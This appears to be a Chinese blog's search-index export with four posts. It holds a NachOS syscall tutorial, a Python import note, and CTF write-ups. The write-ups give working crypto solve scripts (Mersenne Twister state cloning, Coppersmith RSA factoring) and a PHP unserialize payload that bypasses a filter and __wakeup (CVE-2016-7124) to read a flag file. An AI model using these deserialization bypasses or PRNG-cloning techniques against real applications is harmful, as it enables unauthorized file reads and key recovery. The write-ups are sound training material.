<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>NachOS系统调用</title>
    <url>/2021/05/17/NachOS%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/</url>
    <content><![CDATA[<h1 id="一、背景知识"><a href="#一、背景知识" class="headerlink" title="一、背景知识"></a>一、背景知识</h1><p>Nachos 的全称是“Not Another Completely Heuristic Operating System”，它是一个可修改和跟踪的操作系统教学软件。它给出了一个支持多线程和虚拟存储的操作系统骨架，可让学生在较短的时间内对操作系统中的基本原理和核心算法有一个全面和完整的了解。</p>
<h1 id="任务简介"><a href="#任务简介" class="headerlink" title="任务简介"></a>任务简介</h1><p>添加系统调用Print(char* msg)</p>
<p>从API手册可知，操作系统为该任务提供的基础设施有：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kernel-&gt;synConsole-&gt;PutChar(char ch);   &#x2F;&#x2F; 向控制台写字符</span><br><span class="line">kernel-&gt;machine-&gt;ReadRegister(int num); &#x2F;&#x2F; 读寄存器</span><br><span class="line">kernel-&gt;machine-&gt;WriteRegister(int num, int value); &#x2F;&#x2F; 写寄存器</span><br><span class="line">kernel-&gt;machine-&gt;ReadMem(int addr, int size, int * value); &#x2F;&#x2F; 从用户进程内存读值</span><br></pre></td></tr></table></figure>

<h1 id="系统虚拟机运行原理"><a href="#系统虚拟机运行原理" class="headerlink" title="系统虚拟机运行原理"></a>系统虚拟机运行原理</h1><blockquote>
<p>使用该系统运行用户空间程序使用<code>nachos –x program_name </code>命令。程序从 <code>code/threads/main.cc </code>启动，创建了 <code>Kernel</code> 对象并进行初始化（启动主线程、创建线程调度表、中断处理模块、CPU、控制台、文件系统、中断使能等）。之后，程序创建了用户空间程序，初始化的时候加载了指令集并调用了<br><code>kernel-&gt;machine-&gt;WriteRegister</code> 填写 CPU 寄存器，然后开始执行。执行由<br><code>kernel-&gt;machine-&gt;Run</code> 实现，使用 OneInstruction 函数模拟 CPU 的逐条指令执行过程。</p>
</blockquote>
<h1 id="系统调用的实现思路"><a href="#系统调用的实现思路" class="headerlink" title="系统调用的实现思路"></a>系统调用的实现思路</h1><blockquote>
<p>如同 Linux 操作系统一样，运行在虚拟机上的 NachOS 也使用中断来实现系统调<br>用（用户空间程序调用操作系统内核服务的接口）。<br>实现思路为：当系统调用发生的时候，首先把函数参数、系统调用号存入寄存器，然后引发系统中断，通过中断调用进入内核态；在系统调用完成功能之后，内核程序把返回值存入寄存器，然后返回。<br>如同 Linux 操作系统一样，运行在虚拟机上的 NachOS 也使用中断来实现系统调<br>用（用户空间程序调用操作系统内核服务的接口）。<br>实现思路为：当系统调用发生的时候，首先把函数参数、系统调用号存入寄存器，<br>然后引发系统中断，通过中断调用进入内核态；在系统调用完成功能之后，内核<br>程序把返回值存入寄存器，然后返回。</p>
</blockquote>
<h1 id="系统调用的具体实现"><a href="#系统调用的具体实现" class="headerlink" title="系统调用的具体实现"></a>系统调用的具体实现</h1><ol>
<li><p>在<code>/userprog/syscall.h</code>中进行宏定义和函数声明</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SC_Print     21</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Print</span><span class="params">(<span class="keyword">char</span>* msg)</span></span>;</span><br></pre></td></tr></table></figure></li>
<li><p>在<code>/userprog/ksyscall.h</code>中实现函数的功能</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">SysPrint</span><span class="params">( <span class="keyword">char</span> * msg )</span> </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line"> <span class="keyword">int</span> IntValue = <span class="number">0</span>; </span><br><span class="line"> <span class="keyword">int</span> IntMem = (<span class="keyword">int</span>)msg; </span><br><span class="line"> <span class="keyword">do</span> </span><br><span class="line"> &#123; </span><br><span class="line"> <span class="comment">/* 从用户程序内存空间读取字符串的值 */</span> </span><br><span class="line"> kernel-&gt;machine-&gt;ReadMem(<span class="keyword">int</span>(IntMem++), <span class="number">1</span>, &amp;IntValue); </span><br><span class="line"> <span class="keyword">if</span> ( <span class="number">0</span> == IntValue ) <span class="keyword">break</span>; </span><br><span class="line"> kernel-&gt;synchConsoleOut-&gt;PutChar( (<span class="keyword">char</span>)IntValue ); </span><br><span class="line"> &#125;<span class="keyword">while</span>(<span class="literal">true</span>); </span><br><span class="line"> <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure></li>
<li><p>在<code>/userprog/exception.cc</code>完善中断处理函数</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> SC_Print: </span><br><span class="line">    <span class="keyword">int</span> result; </span><br><span class="line">    <span class="comment">/* 取参数，调用自己实现的函数 */</span> </span><br><span class="line">    result = <span class="built_in">SysPrint</span>( (<span class="keyword">char</span> *)kernel-&gt;machine-&gt;<span class="built_in">ReadRegister</span>(<span class="number">4</span>) ); </span><br><span class="line">    kernel-&gt;machine-&gt;<span class="built_in">WriteRegister</span>(<span class="number">2</span>, (<span class="keyword">int</span>)result); <span class="comment">/* 存返回值 */</span> </span><br><span class="line">    <span class="comment">/* 这段是有关 CPU 的一些状态变量设置，参照原来的代码 */</span> </span><br><span class="line">    &#123; </span><br><span class="line">    <span class="comment">/* 保存当前程序计数器 */</span> </span><br><span class="line">    kernel-&gt;machine-&gt;<span class="built_in">WriteRegister</span>(PrevPCReg, </span><br><span class="line">    kernel-&gt;machine-&gt;<span class="built_in">ReadRegister</span>(PCReg)); </span><br><span class="line">    <span class="comment">/* 当前 PC 计数++*/</span> </span><br><span class="line">    kernel-&gt;machine-&gt;<span class="built_in">WriteRegister</span>(PCReg, </span><br><span class="line">    kernel-&gt;machine-&gt;<span class="built_in">ReadRegister</span>(PCReg) + <span class="number">4</span>);  </span><br><span class="line">    kernel-&gt;machine-&gt;<span class="built_in">WriteRegister</span>(NextPCReg, </span><br><span class="line">    kernel-&gt;machine-&gt;<span class="built_in">ReadRegister</span>(PCReg)+<span class="number">4</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span>; <span class="comment">/* 任务已经完成，返回吧 */</span> </span><br><span class="line">    <span class="built_in">ASSERTNOTREACHED</span>(); <span class="comment">/* 断言，如果执行到了说明出错啦 */</span> </span><br><span class="line">    <span class="keyword">break</span>; </span><br></pre></td></tr></table></figure></li>
<li><p>在<code>/test/start.s</code>中补充汇编代码，实现系统调用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">    .globl Print &#x2F;* 声明为外部函数 *&#x2F; </span><br><span class="line">    .ent Print &#x2F;* Print 函数开始 *&#x2F; </span><br><span class="line">Print: </span><br><span class="line">    addiu $2,$0,SC_Print &#x2F;* 将系统调用号存入 r2 寄存器 *&#x2F; </span><br><span class="line">    syscall &#x2F;* 引发系统中断调用 *&#x2F; </span><br><span class="line">    j $31 &#x2F;* 跳转到中断返回的寄存器 r31 *&#x2F; </span><br><span class="line">    .end Print &#x2F;* Print 函数结束*&#x2F; </span><br></pre></td></tr></table></figure></li>
<li><p>在<code>/test</code>下编写<code>print.c</code>，实现函数调用</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;syscall.h&quot;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> result;</span><br><span class="line">        result=Print(<span class="string">&quot;helloworld\n&quot;</span>);</span><br><span class="line">        Halt();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>在<code>/test/Makefile</code>中添加<code>print.c</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SOURCES &#x3D; add.c halt.c matmult.c shell.c sort.c print.c</span><br></pre></td></tr></table></figure></li>
<li><p>在<code>/test</code>下使用<code>make</code>编译</p>
</li>
<li><p>在<code>/build.linux</code>下使用<code>make</code>编译,此时可能会报错，如下图</p>
</li>
</ol>
<p><img src="https://gitee.com/auxein/images/raw/master/NachOS/nachos1.png"></p>
<p>引起错误的原因是因为有其他模块定义了同名的宏。<br>我们需要修改<code>/userprog/syscall.h</code>中的两个宏名称。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#define ConsoleInput         0</span><br><span class="line">#define ConsoleOutput        1</span><br></pre></td></tr></table></figure>

<p>修改完成之后就可以再<code>make</code>会出现<code>warning</code>，但已经无伤大雅了。</p>
<ol start="9">
<li>在<code>/test</code>目录下使用命令<code>../build.linux/nachos -x print.noff</code>运行，可以看到我们的<code>helloworld</code>已经被输出了</li>
</ol>
<p><img src="https://gitee.com/auxein/images/raw/master/NachOS/output_print.png"></p>
]]></content>
  </entry>
  <entry>
    <title>Crypto In SCUCTF 2021</title>
    <url>/2021/05/17/2021scuctf/</url>
    <content><![CDATA[<h2 id="贝斯手"><a href="#贝斯手" class="headerlink" title="贝斯手"></a>贝斯手</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cipher &#x3D; R1EzVElOQlRHSTNVSU5aVUdRNERNTlpWR0UyREVOS0dHWTJES01aVUlZMkRHTkJSR1JCVE9OUlhHNDNFSU5CWUdSRERNUUpXR00yVElOQlNHUTNUTU1aV0dBMkRPTkJSR1laVE9OSldHQTNES01SV0dZMkRLTVJXSU0zRE9OSlFHVTRETVJCVUdRWlVHTVpVR1VaVE9SQlhJUTJETz09PQ</span><br></pre></td></tr></table></figure>
<p>base解密顺序如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">base64--&gt;base32--&gt;base16--&gt;base85--&gt;base58_STRING</span><br></pre></td></tr></table></figure>
<p>得到<code>flag=scuctf&#123;M4ny_k1nds_0f_13a5e!&#125;</code></p>
<h2 id="crypto1"><a href="#crypto1" class="headerlink" title="crypto1"></a>crypto1</h2><p>通过查阅python的random模块，可以得知其在生成随机数时使用了梅森旋转算法，且其版本为MT19937，即该PRNG采用32位的state和32位的输出。该PRNG在初始化时会建立一个长度为624的数组MT，使用extract_number函数来生成随机数，第一次生成随机数时会调用generate_numbers函数来更新MT数组的值，之后每连续生成624个随机数，都会使用generate_numbers函数来更新MT数组的值。而extract_number函数的过程是可逆的，这意味着如果我们知道一个randomnum，我们是可以求出其对应的MT的。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># getrandbits(64) = getrandbits(32) &lt;&lt; 32 | getrandbits(32)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span>():</span></span><br><span class="line">    f=<span class="built_in">open</span>(<span class="string">&quot;test&quot;</span>,<span class="string">&quot;wb&quot;</span>)</span><br><span class="line">    s=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">312</span>):</span><br><span class="line">        s+=<span class="built_in">str</span>(random.getrandbits(<span class="number">64</span>))+<span class="string">&quot;\n&quot;</span></span><br><span class="line">    f.write(s)</span><br></pre></td></tr></table></figure>
<p>给出的代码中生成了312个64位随机数，根据64位随机数的生成原理我们可以发现624个32位随机数是隐藏在其中的。</p>
<p>脚本如下，获取第313个64位随机数的脚本如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> Random</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getrabandbits32</span>(<span class="params">filename</span>):</span></span><br><span class="line">    f = <span class="built_in">open</span>(filename, <span class="string">&#x27;r&#x27;</span>).readlines()</span><br><span class="line">    prng = []</span><br><span class="line">    mx = <span class="number">0xffffffff</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> f:</span><br><span class="line">        i = i.strip(<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">        num = <span class="built_in">int</span>(i)</span><br><span class="line">        num1 = (num &gt;&gt; <span class="number">32</span>) &amp; mx</span><br><span class="line">        num2 = num &amp; mx</span><br><span class="line">        prng.append(num2)</span><br><span class="line">        prng.append(num1)</span><br><span class="line">    <span class="keyword">return</span> prng</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">invert_right</span>(<span class="params">m,l,val=<span class="string">&#x27;&#x27;</span></span>):</span></span><br><span class="line">    length = <span class="number">32</span></span><br><span class="line">    mx = <span class="number">0xffffffff</span></span><br><span class="line">    <span class="keyword">if</span> val == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        val = mx</span><br><span class="line">    i,res = <span class="number">0</span>,<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i*l&lt;length:</span><br><span class="line">        mask = (mx&lt;&lt;(length-l)&amp;mx)&gt;&gt;i*l</span><br><span class="line">        tmp = m &amp; mask</span><br><span class="line">        m = m^tmp&gt;&gt;l&amp;val</span><br><span class="line">        res += tmp</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">invert_left</span>(<span class="params">m,l,val</span>):</span></span><br><span class="line">    length = <span class="number">32</span></span><br><span class="line">    mx = <span class="number">0xffffffff</span></span><br><span class="line">    i,res = <span class="number">0</span>,<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i*l &lt; length:</span><br><span class="line">        mask = (mx&gt;&gt;(length-l)&amp;mx)&lt;&lt;i*l</span><br><span class="line">        tmp = m &amp; mask</span><br><span class="line">        m ^= tmp&lt;&lt;l&amp;val</span><br><span class="line">        res |= tmp</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">invert_temper</span>(<span class="params">m</span>):</span></span><br><span class="line">    m = invert_right(m,<span class="number">18</span>)</span><br><span class="line">    m = invert_left(m,<span class="number">15</span>,<span class="number">4022730752</span>)</span><br><span class="line">    m = invert_left(m,<span class="number">7</span>,<span class="number">2636928640</span>)</span><br><span class="line">    m = invert_right(m,<span class="number">11</span>)</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">clone_mt</span>(<span class="params">record</span>):</span></span><br><span class="line">    state = [invert_temper(i) <span class="keyword">for</span> i <span class="keyword">in</span> record]</span><br><span class="line">    gen = Random()</span><br><span class="line">    gen.setstate((<span class="number">3</span>,<span class="built_in">tuple</span>(state+[<span class="number">0</span>]),<span class="literal">None</span>))</span><br><span class="line">    <span class="keyword">return</span> gen</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">prng = []</span><br><span class="line">prng = getrabandbits32(<span class="string">&#x27;test&#x27;</span>)</span><br><span class="line"></span><br><span class="line">g = clone_mt(prng[:<span class="number">624</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">312</span>):</span><br><span class="line">    out = g.getrandbits(<span class="number">64</span>)</span><br><span class="line">    <span class="built_in">print</span>(out)</span><br><span class="line"></span><br><span class="line">key = g.getrandbits(<span class="number">128</span>)</span><br><span class="line"><span class="built_in">print</span>(key)</span><br></pre></td></tr></table></figure>
<p>得到随机数<code>299960201114667739988297174563368332867</code>,获得密钥后即可完成解密</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from Crypto.Cipher import AES</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line">k &#x3D; 299960201114667739988297174563368332867</span><br><span class="line"></span><br><span class="line">def decrypt():</span><br><span class="line">    key &#x3D; long_to_bytes(k)</span><br><span class="line">    aes &#x3D; AES.new(key, AES.MODE_CBC, b&quot;\x00&quot;*16)</span><br><span class="line">    f &#x3D; open(&quot;out&quot;,&quot;rb&quot;)</span><br><span class="line">    cipher &#x3D; f.read()</span><br><span class="line">    output &#x3D; aes.decrypt(cipher)</span><br><span class="line">    print(output)</span><br><span class="line">    </span><br><span class="line">decrypt()</span><br></pre></td></tr></table></figure>
<p>得到<code>flag=scuctf&#123;af0sd_f8&#125;</code></p>
<h2 id="crypto2"><a href="#crypto2" class="headerlink" title="crypto2"></a>crypto2</h2><p>Coppersmith攻击</p>
<p>编写sage脚本如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def getFullP(low_p, n):</span><br><span class="line">    R.&lt;x&gt; &#x3D; PolynomialRing(Zmod(n), implementation&#x3D;&#39;NTL&#39;)</span><br><span class="line">    p &#x3D; x*2^384 + low_p</span><br><span class="line">    root &#x3D; (p-n).monic().small_roots(X &#x3D; 2^128, beta &#x3D; 0.4)</span><br><span class="line">    if root:</span><br><span class="line">        return p(root[0])</span><br><span class="line">    return None</span><br><span class="line"></span><br><span class="line">n &#x3D; 85016144249518040150910227120120655178858680112497903474795846550337648959184474608344455198424753002209821827392389091448043545937173891641586356377876821641241033232828279439195610943286663032638048058568003136520988549470764306016674503217880123290623177055115638997384030786304744623796469032887028528817</span><br><span class="line">pbar &#x3D; 1145141920069</span><br><span class="line">p &#x3D; getFullP(pbar,n)</span><br><span class="line">print(p)</span><br></pre></td></tr></table></figure>
<p>得到<code>p=9100577608156886077223257362610780621149377885814052415730904118721328908275148008063887016355828659064290353211667316052862069507024555725457694562648389</code></p>
<p>接下来就是常规的<code>RSA</code>了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from Crypto.Util.number import *</span><br><span class="line"></span><br><span class="line">n&#x3D;85016144249518040150910227120120655178858680112497903474795846550337648959184474608344455198424753002209821827392389091448043545937173891641586356377876821641241033232828279439195610943286663032638048058568003136520988549470764306016674503217880123290623177055115638997384030786304744623796469032887028528817</span><br><span class="line">c&#x3D;83724265903365973936178131138176403586796491037282811488797349096425411605088349291193550728134684573063610685342590513444340298881918101517014943046522979731970278182306111863948764449232289625176702192589838375986050458189860493609407060988207562417247647655585368569618561494059816502622854344519538215287</span><br><span class="line">e&#x3D;65537</span><br><span class="line">p &#x3D; 9100577608156886077223257362610780621149377885814052415730904118721328908275148008063887016355828659064290353211667316052862069507024555725457694562648389</span><br><span class="line">q &#x3D; n&#x2F;&#x2F;p</span><br><span class="line">phi &#x3D; (p-1)*(q-1)</span><br><span class="line">d &#x3D; inverse(e,phi)</span><br><span class="line">m &#x3D; pow(c,d,n)</span><br><span class="line">print(long_to_bytes(m))</span><br></pre></td></tr></table></figure>
<p>得到<code>flag=scuctf&#123;f05fe93d159b398fe25f280d94241261&#125;</code></p>
]]></content>
      <tags>
        <tag>crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>Python Import 机制小记</title>
    <url>/2021/10/22/Python%20Import%20%E6%9C%BA%E5%88%B6%E5%B0%8F%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="Python-Import-机制小记"><a href="#Python-Import-机制小记" class="headerlink" title="Python Import 机制小记"></a>Python Import 机制小记</h1><h2 id="模块（module）与包-（package）"><a href="#模块（module）与包-（package）" class="headerlink" title="模块（module）与包 （package）"></a>模块（module）与包 （package）</h2><h3 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h3><p>典型的，一个 <code>.py</code> 后缀文件即是<code>Python</code>的一个模块。在模块的内部，可以通过全局变量 <code>__name__</code> 来获得模块名。模块可以包含可执行的语句，这些语句会在模块 <strong>初始化</strong> 的时候执行 —— 当所在模块被 <code>import</code> 导入时它们有且只会执行一次。</p>
<h3 id="包"><a href="#包" class="headerlink" title="包"></a>包</h3><p>根据目前 <code>PEP420</code> 的提案，目前的 <code>Python</code> 实际上是有两种包的存在：<strong>正规包</strong>（<code>regular Package</code>） 以及 <strong>命名空间包</strong>（<code>Namespace package</code>）</p>
<ul>
<li><p>正规包：<br>在 Python 3.2 之前就已经存在了的，通常是以包含一个 <code>__init__.py</code> 文件的目录形式展现。当 package 被导入时，这个 <code>__init__.py</code> 文件会被 <em>隐式</em> 地执行。</p>
</li>
<li><p>命名空间包</p>
<p>根据 PEP420 的定义，命名空间包是由多个 <em>portion</em> 组成的 —— <em>portion</em> 类似于父包下的子包，但它们物理位置上不一定相邻，而且它们可能表现为 .zip 中的文件、网络上的文件等等。命名空间包不需要 <code>__init__.py</code> 文件，只要它本身或者子包（也就是 <em>portion*）被导入时，Python 就会给顶级的部分创建为命名空间包 —— 因此，命名空间包不一定直接对应到文件系统中的对象，它可以是一个 *虚拟</em> 的 module 。</p>
</li>
</ul>
<h2 id="Import-机制"><a href="#Import-机制" class="headerlink" title="Import 机制"></a>Import 机制</h2><p>模块中的 Python 代码可以通过 import（导入）操作访问另一个模块内的代码。<code>import</code> 语句时调起导入机制的常用方式，但不是唯一方式。<code>importlib.import_module()</code> 以及内置的 <code>__import__()</code> 函数都可以调起导入机制。</p>
]]></content>
  </entry>
  <entry>
    <title>XCTF-Web_php_unserialize</title>
    <url>/2020/08/14/XCTF-Web_php_unserialize/</url>
    <content><![CDATA[<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p>题目如下<br><img src="https://img-blog.csdnimg.cn/20200814193603290.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTYxMzc2MA==,size_16,color_FFFFFF,t_70#pic_center"><br>可以看出来这是一道关于反序列化的题目</p>
<h1 id="分析题目"><a href="#分析题目" class="headerlink" title="分析题目"></a>分析题目</h1><p>看一下题目的代码</p>
<ul>
<li> 首先判断GET参数 <strong>“var”</strong> 是否存在，然后通过base64解码传入变量var，如果不存在就输出网页源码</li>
<li> 对<strong>var</strong>进行一个正则过滤，如果通过正则过滤便会进行反序列化，否则响应信息’stop hacking!’</li>
</ul>
<h1 id="题目中出现的魔术方法"><a href="#题目中出现的魔术方法" class="headerlink" title="题目中出现的魔术方法"></a>题目中出现的魔术方法</h1><p>题目中存在一个demo类</p>
<ul>
<li><code>__contrust()</code><br>见名知意，构造方法。具有构造方法的类会在每次创建新对象前调用此方法 ，该方法常用于完成一些初始化工作。</li>
<li><code>__destruct()</code><br>析构方法 ，当 某个对象的所有引用都被删除或者当对象被显式销毁时 ， 析构函数会被执行。</li>
<li><code>__wakeup()</code><br>是用在反序列化操作中。<strong>unserialize()</strong> 会检查存在一个 <strong>__wakeup()</strong>    方法。如果存在，则先会调用 <strong>__wakeup()</strong> 方法。 <strong>__wakeup()</strong> 经常用在反序列化操作中，例如重新建立数据库连接，或执行其它初始化操作。</li>
</ul>
<h1 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h1><ul>
<li>通过GET传入base64编码得参数且要绕过正则过滤</li>
<li>绕过 <strong>__wakeup()</strong><br>解释，源码中提示flag在 <strong>fl4g.php</strong> 中，而使用调用 <strong>__wakeup()</strong> 会强制将 <strong>$file</strong> 变量复制为index.php</li>
</ul>
<h1 id="开始解题"><a href="#开始解题" class="headerlink" title="开始解题"></a>开始解题</h1><h2 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h2><p>代码如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = <span class="variable">$file</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="literal">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Demo(<span class="string">&#x27;fl4g.php&#x27;</span>);</span><br><span class="line"><span class="variable">$b</span> = serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>运行后结果如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:4:&quot;Demo&quot;:1:&#123;s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="绕过正则"><a href="#绕过正则" class="headerlink" title="绕过正则"></a>绕过正则</h2><p>该题正则匹配的规则如下:<br>在不区分大小写的情况下 ， 若字符串出现 <strong>“o:数字”</strong> 或者 <strong>“c:数字’</strong> 这样的格式 ， 那么就被过滤。<br>我们传入得参数类型为对象 <strong>“ O “</strong> ， 又因为序列化字符串的格式为 <strong>参数格式:参数名长度</strong> ， 因此 <strong>“ O:4 “</strong> 这样的字符串肯定无法通过正则匹配<br>这里利用了一个php反序列化的特性（感兴趣可以自行百度），需要注意的是在php7中这部分代码被修改了，无法使用。</p>
<h3 id="获取php版本"><a href="#获取php版本" class="headerlink" title="获取php版本"></a>获取php版本</h3><p>使用dirsearch进行扫描<br><img src="https://img-blog.csdnimg.cn/20200814200908751.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTYxMzc2MA==,size_16,color_FFFFFF,t_70#pic_center"><br>可以找到泄露的PHP信息<br><img src="https://img-blog.csdnimg.cn/2020081420102849.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTYxMzc2MA==,size_16,color_FFFFFF,t_70#pic_center"></p>
<h3 id="利用特性"><a href="#利用特性" class="headerlink" title="利用特性"></a>利用特性</h3><p>反序列化操作 <strong>参数格式:参数名长度</strong> 时，当格式为 <strong>参数格式:+参数名长度</strong> 会返回同样的结果，故我们可以通过这个方法绕过正则过滤</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:+4:&quot;Demo&quot;:1:&#123;s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;&#125;</span><br></pre></td></tr></table></figure>
<h2 id="绕过-wakeup"><a href="#绕过-wakeup" class="headerlink" title="绕过__wakeup()"></a>绕过__wakeup()</h2><p>对应的CVE编号: <strong>CVE-2016-7124</strong></p>
<ul>
<li>存在漏洞的PHP版本: <strong>PHP5.6.25</strong> 之前版本和 <strong>7.0.10</strong> 之前的<strong>7.x</strong>版本</li>
<li>漏洞概述: <strong>__wakeup()</strong> 魔法函数被绕过,导致执行了一些非预期效果的漏洞</li>
<li>漏洞原理: 当对象的 <strong>属性(变量)数</strong> 大于实际的个数时, <strong>__wakeup()</strong> 魔法函数被绕过</li>
</ul>
<p>故序列化结果修改如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:4:&quot;Demo&quot;:1:&#123;s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;&#125;</span><br></pre></td></tr></table></figure>
<h2 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h2><p>题目中知道还需要进行base64编码<br>构造payload如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?var&#x3D;TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>
<p>得到flag<br><img src="https://img-blog.csdnimg.cn/20200814202144316.png#pic_center"></p>
<h1 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h1><blockquote>
<p>需要注意的一点是private和protect属性的序列化</p>
</blockquote>
<p>直接上代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&quot;winny&quot;</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$age</span>=<span class="string">&quot;8&quot;</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$sex</span>=<span class="string">&quot;female&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> test();</span><br><span class="line">    <span class="variable">$a</span>=serialize(<span class="variable">$a</span>);</span><br><span class="line">    print_r(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>序列化显示如下</p>
